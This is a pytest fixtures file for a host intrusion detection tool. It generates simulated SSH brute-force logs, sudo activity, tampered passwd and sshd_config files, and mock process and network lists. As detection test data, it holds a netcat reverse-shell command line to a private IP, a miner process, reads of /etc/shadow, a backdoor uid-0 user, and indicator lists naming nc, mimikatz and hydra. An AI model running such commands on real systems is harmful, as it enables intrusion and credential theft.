"""Pytest fixtures for hids-mcp tests."""

import hashlib
import os
import tempfile
from datetime import datetime, timedelta
from pathlib import Path
from typing import Generator

import pytest


@pytest.fixture
def temp_dir() -> Generator[Path, None, None]:
    """Create a temporary directory for test files."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)


# ==============================================================================
# Auth Log Fixtures
# ==============================================================================

@pytest.fixture
def sample_auth_log(temp_dir: Path) -> Path:
    """Create a sample auth log file with normal authentication activity."""
    log_path = temp_dir / "auth.log"
    base_time = datetime.now() - timedelta(hours=1)

    lines = []
    for i in range(20):
        ts = base_time + timedelta(minutes=i * 3)
        timestamp = ts.strftime("%b %d %H:%M:%S")
        # Successful SSH login
        lines.append(
            f"{timestamp} server sshd[{10000 + i}]: Accepted publickey for admin from 192.168.1.{i % 10 + 1} port {50000 + i} ssh2"
        )

    log_path.write_text("\n".join(lines))
    return log_path


@pytest.fixture
def brute_force_auth_log(temp_dir: Path) -> Path:
    """Create an auth log simulating SSH brute force attack."""
    log_path = temp_dir / "auth.log"
    base_time = datetime.now() - timedelta(minutes=30)

    lines = []
    attacker_ip = "10.0.0.100"

    # 50 failed password attempts from single IP
    for i in range(50):
        ts = base_time + timedelta(seconds=i * 2)
        timestamp = ts.strftime("%b %d %H:%M:%S")
        user = f"user{i % 10}"
        lines.append(
            f"{timestamp} server sshd[{20000 + i}]: Failed password for {user} from {attacker_ip} port {40000 + i} ssh2"
        )

    # Some invalid user attempts
    for i in range(20):
        ts = base_time + timedelta(seconds=100 + i * 2)
        timestamp = ts.strftime("%b %d %H:%M:%S")
        lines.append(
            f"{timestamp} server sshd[{21000 + i}]: Invalid user hacker{i} from {attacker_ip} port {45000 + i}"
        )

    # Add some legitimate traffic
    for i in range(5):
        ts = base_time + timedelta(seconds=i * 60)
        timestamp = ts.strftime("%b %d %H:%M:%S")
        lines.append(
            f"{timestamp} server sshd[{22000 + i}]: Accepted publickey for admin from 192.168.1.10 port {55000 + i} ssh2"
        )

    log_path.write_text("\n".join(lines))
    return log_path


@pytest.fixture
def distributed_brute_force_log(temp_dir: Path) -> Path:
    """Create an auth log simulating distributed brute force from multiple IPs."""
    log_path = temp_dir / "auth.log"
    base_time = datetime.now() - timedelta(minutes=60)

    lines = []

    # Failed attempts from 20 different IPs, each with 10 attempts
    # Each IP should be consistent across all its attempts
    for ip_num in range(20):
        ip = f"10.0.{ip_num}.100"  # Fixed IP for each attacker
        for attempt in range(10):
            ts = base_time + timedelta(seconds=ip_num * 30 + attempt * 2)
            timestamp = ts.strftime("%b %d %H:%M:%S")
            lines.append(
                f"{timestamp} server sshd[{30000 + ip_num * 10 + attempt}]: Failed password for root from {ip} port {35000 + attempt} ssh2"
            )

    log_path.write_text("\n".join(lines))
    return log_path


@pytest.fixture
def sudo_activity_log(temp_dir: Path) -> Path:
    """Create an auth log with sudo commands."""
    log_path = temp_dir / "auth.log"
    base_time = datetime.now() - timedelta(hours=2)

    lines = []
    commands = [
        "/usr/bin/apt update",
        "/usr/bin/systemctl restart nginx",
        "/bin/cat /etc/shadow",
        "/usr/bin/useradd newuser",
        "/bin/rm -rf /tmp/cache",
        "/usr/bin/chmod 777 /var/www",
    ]

    for i, cmd in enumerate(commands):
        ts = base_time + timedelta(minutes=i * 10)
        timestamp = ts.strftime("%b %d %H:%M:%S")
        lines.append(
            f"{timestamp} server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND={cmd}"
        )

    log_path.write_text("\n".join(lines))
    return log_path


@pytest.fixture
def session_activity_log(temp_dir: Path) -> Path:
    """Create an auth log with session open/close events."""
    log_path = temp_dir / "auth.log"
    base_time = datetime.now() - timedelta(hours=4)

    lines = []
    users = ["admin", "developer", "deploy", "backup"]

    for i, user in enumerate(users):
        # Session opened
        ts = base_time + timedelta(hours=i)
        timestamp = ts.strftime("%b %d %H:%M:%S")
        lines.append(
            f"{timestamp} server sshd[{40000 + i}]: pam_unix(sshd:session): session opened for user {user}"
        )
        # Session closed
        ts_close = ts + timedelta(minutes=30)
        timestamp_close = ts_close.strftime("%b %d %H:%M:%S")
        lines.append(
            f"{timestamp_close} server sshd[{40000 + i}]: pam_unix(sshd:session): session closed for user {user}"
        )

    log_path.write_text("\n".join(lines))
    return log_path


@pytest.fixture
def empty_auth_log(temp_dir: Path) -> Path:
    """Create an empty auth log file."""
    log_path = temp_dir / "auth.log"
    log_path.write_text("")
    return log_path


@pytest.fixture
def malformed_auth_log(temp_dir: Path) -> Path:
    """Create an auth log with malformed entries."""
    log_path = temp_dir / "auth.log"
    lines = [
        "This is not a valid log line",
        "Neither is this one",
        "random garbage data",
        "",
        "incomplete sshd entry without proper format",
    ]
    log_path.write_text("\n".join(lines))
    return log_path


# ==============================================================================
# File Integrity Fixtures
# ==============================================================================

@pytest.fixture
def critical_files(temp_dir: Path) -> dict:
    """Create mock critical system files for integrity testing."""
    files = {}

    # Create passwd file
    passwd_path = temp_dir / "passwd"
    passwd_content = "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:Admin:/home/admin:/bin/bash"
    passwd_path.write_text(passwd_content)
    files["passwd"] = str(passwd_path)

    # Create shadow file
    shadow_path = temp_dir / "shadow"
    shadow_content = "root:$6$hash:18000:0:99999:7:::\nadmin:$6$hash2:18000:0:99999:7:::"
    shadow_path.write_text(shadow_content)
    files["shadow"] = str(shadow_path)

    # Create sudoers file
    sudoers_path = temp_dir / "sudoers"
    sudoers_content = "root ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL"
    sudoers_path.write_text(sudoers_content)
    files["sudoers"] = str(sudoers_path)

    # Create sshd_config
    sshd_config_path = temp_dir / "sshd_config"
    sshd_config_content = "Port 22\nPermitRootLogin no\nPasswordAuthentication yes"
    sshd_config_path.write_text(sshd_config_content)
    files["sshd_config"] = str(sshd_config_path)

    return files


@pytest.fixture
def file_integrity_baseline(temp_dir: Path, critical_files: dict) -> Path:
    """Create a baseline hash file for integrity monitoring."""
    import json

    baseline_path = temp_dir / "baseline.json"
    hashes = {}

    for name, filepath in critical_files.items():
        with open(filepath, 'rb') as f:
            file_hash = hashlib.sha256(f.read()).hexdigest()
            hashes[filepath] = file_hash

    baseline_path.write_text(json.dumps(hashes))
    return baseline_path


@pytest.fixture
def modified_files(temp_dir: Path, critical_files: dict, file_integrity_baseline: Path) -> dict:
    """Modify some critical files after baseline is created."""
    import json

    # Modify passwd file
    passwd_path = Path(critical_files["passwd"])
    passwd_path.write_text(
        "root:x:0:0:root:/root:/bin/bash\n"
        "admin:x:1000:1000:Admin:/home/admin:/bin/bash\n"
        "hacker:x:0:0:hacker:/root:/bin/bash"  # Added malicious user
    )

    # Modify sshd_config
    sshd_path = Path(critical_files["sshd_config"])
    sshd_path.write_text(
        "Port 22\nPermitRootLogin yes\nPasswordAuthentication yes"  # Changed PermitRootLogin
    )

    return {
        "files": critical_files,
        "baseline": str(file_integrity_baseline),
        "modified": ["passwd", "sshd_config"]
    }


# ==============================================================================
# Process Simulation Fixtures
# ==============================================================================

@pytest.fixture
def mock_process_list():
    """Return mock process data for testing suspicious process detection."""
    return [
        # Normal processes
        {"pid": 1, "name": "systemd", "username": "root", "exe": "/lib/systemd/systemd", "cmdline": "/lib/systemd/systemd"},
        {"pid": 100, "name": "sshd", "username": "root", "exe": "/usr/sbin/sshd", "cmdline": "/usr/sbin/sshd -D"},
        {"pid": 200, "name": "nginx", "username": "www-data", "exe": "/usr/sbin/nginx", "cmdline": "nginx: master process"},
        {"pid": 300, "name": "python3", "username": "admin", "exe": "/usr/bin/python3", "cmdline": "python3 app.py"},

        # Suspicious processes
        {"pid": 1001, "name": "nc", "username": "www-data", "exe": "/usr/bin/nc", "cmdline": "nc -e /bin/sh 10.0.0.1 4444"},
        {"pid": 1002, "name": "xmrig", "username": "nobody", "exe": "/tmp/xmrig", "cmdline": "/tmp/xmrig -o pool.crypto.com"},
        {"pid": 1003, "name": ".hidden", "username": "root", "exe": "/tmp/.hidden", "cmdline": "/tmp/.hidden"},
        {"pid": 1004, "name": "python", "username": "www-data", "exe": "/dev/shm/python", "cmdline": "/dev/shm/python -c exec(...)"},
    ]


@pytest.fixture
def suspicious_process_indicators():
    """Return list of suspicious process indicators for testing."""
    return {
        "names": ["nc", "ncat", "netcat", "xmrig", "minerd", "cryptominer", "mimikatz", "hydra"],
        "paths": ["/tmp/", "/dev/shm/", "/var/tmp/", "/run/user/"],
        "patterns": ["deleted", ".hidden", "reverse", "shell"],
    }


# ==============================================================================
# Network Connection Fixtures
# ==============================================================================

@pytest.fixture
def mock_network_connections():
    """Return mock network connection data for testing."""
    return [
        # Normal connections
        {"family": "IPv4", "type": "TCP", "local": "0.0.0.0:22", "remote": None, "status": "LISTEN", "pid": 100, "process": "sshd"},
        {"family": "IPv4", "type": "TCP", "local": "0.0.0.0:80", "remote": None, "status": "LISTEN", "pid": 200, "process": "nginx"},
        {"family": "IPv4", "type": "TCP", "local": "192.168.1.10:22", "remote": "192.168.1.100:45000", "status": "ESTABLISHED", "pid": 100, "process": "sshd"},

        # Suspicious connections
        {"family": "IPv4", "type": "TCP", "local": "192.168.1.10:45678", "remote": "10.0.0.50:4444", "status": "ESTABLISHED", "pid": 1001, "process": "nc"},
        {"family": "IPv4", "type": "TCP", "local": "0.0.0.0:31337", "remote": None, "status": "LISTEN", "pid": 1002, "process": "backdoor"},
    ]


@pytest.fixture
def suspicious_ports():
    """Return list of suspicious ports for testing."""
    return [4444, 5555, 6666, 7777, 8888, 1337, 31337, 12345]


# ==============================================================================
# Threat Pattern Fixtures
# ==============================================================================

@pytest.fixture
def auth_patterns():
    """Return compiled regex patterns for auth log parsing."""
    import re
    return {
        "failed_password": re.compile(r'Failed password for (?:invalid user )?(\S+) from (\S+)'),
        "accepted_password": re.compile(r'Accepted password for (\S+) from (\S+)'),
        "accepted_key": re.compile(r'Accepted publickey for (\S+) from (\S+)'),
        "invalid_user": re.compile(r'Invalid user (\S+) from (\S+)'),
        "sudo": re.compile(r'sudo:\s+(\S+)\s+:.*COMMAND=(.*)'),
    }


@pytest.fixture
def threat_indicators():
    """Return known threat indicators for testing."""
    return {
        "known_bad_ips": ["10.0.0.100", "10.0.0.101", "192.0.2.1"],
        "suspicious_users": ["hacker", "admin123", "test", "guest"],
        "dangerous_commands": [
            "chmod 777",
            "rm -rf /",
            "/etc/shadow",
            "useradd",
            "passwd",
        ],
    }


# ==============================================================================
# Alert Configuration Fixtures
# ==============================================================================

@pytest.fixture
def alert_thresholds():
    """Return alert threshold configuration."""
    return {
        "brute_force_threshold": 5,
        "brute_force_window_minutes": 10,
        "user_enumeration_threshold": 20,
        "suspicious_process_threshold": 1,
        "file_change_severity": "high",
    }


@pytest.fixture
def severity_levels():
    """Return severity level definitions."""
    return {
        "critical": {"priority": 1, "escalate": True},
        "high": {"priority": 2, "escalate": True},
        "medium": {"priority": 3, "escalate": False},
        "low": {"priority": 4, "escalate": False},
        "info": {"priority": 5, "escalate": False},
    }
